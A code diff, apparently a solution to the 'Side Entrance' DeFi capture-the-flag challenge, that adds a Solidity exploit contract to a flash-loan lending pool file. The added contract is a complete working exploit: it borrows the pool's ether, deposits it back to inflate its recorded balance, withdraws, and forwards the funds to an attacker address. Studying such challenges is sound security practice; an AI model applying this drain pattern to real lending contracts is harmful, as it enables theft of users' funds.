@@ -1,3 +1,4 @@
+
 // SPDX-License-Identifier: MIT
 
 pragma solidity ^0.8.0;
@@ -36,3 +37,30 @@ contract SideEntranceLenderPool {
     }
 }
  
+contract ExploitSideEntrance{
+    SideEntranceLenderPool thePool;
+    address payable attacker;
+    constructor(address _thePool){
+        thePool = SideEntranceLenderPool(_thePool);
+        attacker = payable(msg.sender);
+    }
+
+    function attack(uint256 amount) public {
+        //call for a flashLoan() to borrow all the tokens in the lendingPool
+        thePool.flashLoan(amount);
+        //withdraw the tokens from the pool
+        thePool.withdraw();
+
+    }
+
+    function execute() public payable {
+        //The function called by the IFlashLoanEtherReceiver
+        //Deposit the tokens back to the pool which updates the "balances" state variable
+        thePool.deposit{value: address(this).balance}();
+    }
+
+    receive() external payable {
+        //transfer the tokens to the attacker address directly from the pool
+        attacker.transfer(address(this).balance);
+    }
+}
